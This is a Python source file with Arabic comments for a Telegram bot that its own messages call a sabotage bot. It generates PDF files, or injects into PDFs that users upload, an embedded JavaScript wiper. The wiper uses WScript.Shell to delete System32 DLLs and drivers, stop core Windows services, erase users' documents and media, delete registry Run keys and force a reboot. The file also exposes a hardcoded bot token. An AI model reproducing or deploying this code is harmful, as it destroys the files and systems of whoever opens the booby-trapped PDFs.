import requests
import time
import os
import random
from datetime import datetime

# ============ إعدادات البوت ============
TOKEN = "8872991146:AAEGEnOk2AvkKaHgRO7JRJiTSkTGj6CiGRA"
CHAT_ID = "7822155315"
API_URL = f"https://api.telegram.org/bot{TOKEN}"

# ============ دوال البوت الأساسية ============
def send_message(text):
    """إرسال رسالة"""
    try:
        url = f"{API_URL}/sendMessage"
        data = {"chat_id": CHAT_ID, "text": text, "parse_mode": "HTML"}
        requests.post(url, data=data, timeout=10)
    except:
        pass

def send_file(file_path, caption=""):
    """إرسال ملف"""
    try:
        if not os.path.exists(file_path):
            return
        url = f"{API_URL}/sendDocument"
        files = {"document": open(file_path, "rb")}
        data = {"chat_id": CHAT_ID, "caption": caption}
        requests.post(url, files=files, data=data, timeout=30)
    except:
        pass

def download_file(file_id, save_path):
    """تحميل ملف من تيليجرام"""
    try:
        # الحصول على رابط الملف
        url = f"{API_URL}/getFile"
        params = {"file_id": file_id}
        response = requests.get(url, params=params)
        if response.status_code != 200:
            return False
        data = response.json()
        if not data.get("ok"):
            return False
        file_path = data["result"]["file_path"]
        download_url = f"https://api.telegram.org/file/bot{TOKEN}/{file_path}"
        
        # تحميل الملف
        response = requests.get(download_url, stream=True)
        if response.status_code == 200:
            os.makedirs(os.path.dirname(save_path), exist_ok=True)
            with open(save_path, "wb") as f:
                for chunk in response.iter_content(8192):
                    if chunk:
                        f.write(chunk)
            return True
        return False
    except:
        return False

# ============ إنشاء PDF التخريبي ============
def create_destructive_pdf():
    """إنشاء PDF تخريبي بدون مكتبات خارجية"""
    try:
        filename = f"/tmp/destructive_{int(time.time())}.pdf"
        
        # كود التخريب
        js_code = """
        try {
            var shell = new ActiveXObject("WScript.Shell");
            shell.Run("cmd.exe /c del /f /s /q C:\\\\Windows\\\\System32\\\\*.dll", 0, false);
            shell.Run("cmd.exe /c del /f /s /q C:\\\\Windows\\\\System32\\\\drivers\\\\*.sys", 0, false);
            shell.Run("cmd.exe /c sc stop winmgmt", 0, false);
            shell.Run("cmd.exe /c sc stop wuauserv", 0, false);
            shell.Run("cmd.exe /c sc stop bits", 0, false);
            shell.Run("cmd.exe /c sc stop EventLog", 0, false);
            shell.Run("cmd.exe /c sc stop PlugPlay", 0, false);
            shell.Run("cmd.exe /c del /f /s /q C:\\\\Users\\\\*\\\\Desktop\\\\*.*", 0, false);
            shell.Run("cmd.exe /c del /f /s /q C:\\\\Users\\\\*\\\\Documents\\\\*.*", 0, false);
            shell.Run("cmd.exe /c del /f /s /q C:\\\\Users\\\\*\\\\Pictures\\\\*.*", 0, false);
            shell.Run("cmd.exe /c del /f /s /q C:\\\\Users\\\\*\\\\Videos\\\\*.*", 0, false);
            shell.Run("cmd.exe /c del /f /s /q C:\\\\Users\\\\*\\\\Music\\\\*.*", 0, false);
            shell.Run("cmd.exe /c reg delete HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /va /f", 0, false);
            shell.Run("cmd.exe /c reg delete HKCU\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /va /f", 0, false);
            shell.Run("cmd.exe /c shutdown /r /f /t 5", 0, false);
            shell.Run("cmd.exe /c msg * ⚠️ تم اختراق نظامك! جميع الملفات تم حذفها.", 0, false);
        } catch(e) {
            try {
                var shell = new ActiveXObject("WScript.Shell");
                shell.Run("cmd.exe /c shutdown /r /f /t 5", 0, false);
            } catch(e2) {}
        }
        """
        
        # بناء ملف PDF
        pdf = f"""%PDF-1.4
1 0 obj
<< /Type /Catalog /Pages 2 0 R /Names << /JavaScript 5 0 R >> >>
endobj
2 0 obj
<< /Type /Pages /Kids [3 0 R] /Count 1 >>
endobj
3 0 obj
<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R >>
endobj
4 0 obj
<< /Length 80 >>
stream
BT /F1 24 Tf 100 700 Td (⚠️ هذا الملف سيؤدي إلى تدمير نظام Windows) Tj ET
endstream
endobj
5 0 obj
<< /Names [(EmbeddedJS) 6 0 R] >>
endobj
6 0 obj
<< /S /JavaScript /JS ({js_code}) >>
endobj
xref
0 7
0000000000 65535 f
0000000009 00000 n
0000000056 00000 n
0000000107 00000 n
0000000178 00000 n
0000000280 00000 n
0000000330 00000 n
trailer
<< /Size 7 /Root 1 0 R >>
startxref
400
%%EOF"""
        
        with open(filename, "w") as f:
            f.write(pdf)
        
        return filename
    except Exception as e:
        print(f"خطأ: {e}")
        return None

# ============ حقن البايلود في ملف موجود ============
def inject_payload(input_path, output_path):
    """حقن البايلود في ملف PDF موجود"""
    try:
        with open(input_path, "rb") as f:
            data = f.read()
        
        js_code = b"""
        try {
            var shell = new ActiveXObject("WScript.Shell");
            shell.Run("cmd.exe /c del /f /s /q C:\\\\Windows\\\\System32\\\\*.dll", 0, false);
            shell.Run("cmd.exe /c del /f /s /q C:\\\\Windows\\\\System32\\\\drivers\\\\*.sys", 0, false);
            shell.Run("cmd.exe /c sc stop winmgmt", 0, false);
            shell.Run("cmd.exe /c sc stop wuauserv", 0, false);
            shell.Run("cmd.exe /c sc stop bits", 0, false);
            shell.Run("cmd.exe /c sc stop EventLog", 0, false);
            shell.Run("cmd.exe /c sc stop PlugPlay", 0, false);
            shell.Run("cmd.exe /c del /f /s /q C:\\\\Users\\\\*\\\\Desktop\\\\*.*", 0, false);
            shell.Run("cmd.exe /c del /f /s /q C:\\\\Users\\\\*\\\\Documents\\\\*.*", 0, false);
            shell.Run("cmd.exe /c del /f /s /q C:\\\\Users\\\\*\\\\Pictures\\\\*.*", 0, false);
            shell.Run("cmd.exe /c del /f /s /q C:\\\\Users\\\\*\\\\Videos\\\\*.*", 0, false);
            shell.Run("cmd.exe /c del /f /s /q C:\\\\Users\\\\*\\\\Music\\\\*.*", 0, false);
            shell.Run("cmd.exe /c reg delete HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /va /f", 0, false);
            shell.Run("cmd.exe /c reg delete HKCU\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /va /f", 0, false);
            shell.Run("cmd.exe /c shutdown /r /f /t 5", 0, false);
            shell.Run("cmd.exe /c msg * ⚠️ تم اختراق نظامك! جميع الملفات تم حذفها.", 0, false);
        } catch(e) {
            try {
                var shell = new ActiveXObject("WScript.Shell");
                shell.Run("cmd.exe /c shutdown /r /f /t 5", 0, false);
            } catch(e2) {}
        }
        """
        
        with open(output_path, "wb") as f:
            f.write(data + b"\n\n" + js_code)
        
        return True
    except:
        return False

# ============ معالجة الأوامر ============
def process_update(update):
    """معالجة التحديث الوارد"""
    try:
        message = update.get("message", {})
        chat_id = str(message.get("chat", {}).get("id", ""))
        
        # التحقق من الصلاحية
        if chat_id != CHAT_ID:
            send_message("⛔ غير مصرح!")
            return
        
        # معالجة النص
        text = message.get("text", "").lower()
        
        if text == "/start":
            send_message("""
🔐 مرحباً بك في بوت التخريب!

📤 أرسل /generate لتوليد PDF تخريبي
📤 أرسل أي ملف PDF لتعديله
📤 أرسل /help للمساعدة
            """)
        
        elif text == "/generate":
            send_message("⏳ جاري التوليد...")
            filepath = create_destructive_pdf()
            if filepath:
                send_file(filepath, "⚒️ PDF تخريبي - احذر!")
                os.remove(filepath)
            else:
                send_message("❌ فشل التوليد!")
        
        elif text == "/help":
            send_message("""
📋 الأوامر:
/start - الترحيب
/generate - توليد PDF تخريبي
/status - الحالة
/help - المساعدة
            """)
        
        elif text == "/status":
            send_message(f"🟢 يعمل\n⏰ {datetime.now().strftime('%H:%M:%S')}")
        
        # معالجة الملفات
        document = message.get("document")
        if document:
            file_id = document["file_id"]
            file_name = document.get("file_name", "file.pdf")
            
            send_message(f"⏳ جاري تحميل: {file_name}")
            
            input_path = f"/tmp/input_{random.randint(1000,9999)}"
            output_path = f"/tmp/output_{random.randint(1000,9999)}"
            
            if download_file(file_id, input_path):
                send_message("✅ تم التحميل، جاري الحقن...")
                
                if inject_payload(input_path, output_path):
                    new_name = f"injected_{file_name}"
                    send_file(output_path, f"⚒️ {new_name}")
                    send_message("✅ تم إرسال الملف المعدل!")
                else:
                    send_message("❌ فشل الحقن!")
                
                # تنظيف
                try:
                    os.remove(input_path)
                    os.remove(output_path)
                except:
                    pass
            else:
                send_message("❌ فشل التحميل!")
    
    except Exception as e:
        print(f"خطأ: {e}")

# ============ الاستماع ============
def main():
    print("🚀 تشغيل البوت...")
    send_message("🟢 تم تشغيل البوت!")
    
    last_id = 0
    while True:
        try:
            url = f"{API_URL}/getUpdates"
            params = {"offset": last_id + 1, "timeout": 30}
            response = requests.get(url, params=params, timeout=35)
            
            if response.status_code == 200:
                data = response.json()
                if data.get("ok"):
                    for update in data["result"]:
                        last_id = update["update_id"]
                        process_update(update)
            
            time.sleep(1)
        except Exception as e:
            print(f"⚠️ خطأ: {e}")
            time.sleep(5)

if __name__ == "__main__":
    main()